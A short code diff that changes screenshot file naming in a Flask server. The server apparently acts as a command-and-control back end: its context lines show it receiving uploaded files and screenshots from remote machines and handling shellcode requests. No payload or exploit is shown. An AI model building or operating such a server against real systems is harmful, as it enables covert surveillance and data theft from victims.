@@ -24,6 +24,7 @@ from flask import (
     Blueprint
 )
 from PIL import Image
+from hashlib import md5
 from random import randint
 from binascii import hexlify
 from tabulate import tabulate
@@ -362,7 +363,7 @@ def handlePOST():
                 print(f'[{B+G}SUCCESS{RA}] {filename} successfully uploaded!')
         elif request.headers.get('Action') == 'screenshot':
             img = Image.open(io.BytesIO(request.data))
-            screenshot_name = f"screenshot_{randint(0,1000)}.png"
+            screenshot_name = f"{md5(str(img).encode()).hexdigest()[:10]}.png"
             img.save(screenshot_name)
             print(f'[{B+G}SUCCESS{RA}] {screenshot_name} successfully downloaded!')
         elif request.headers.get('Shellcode_id'):
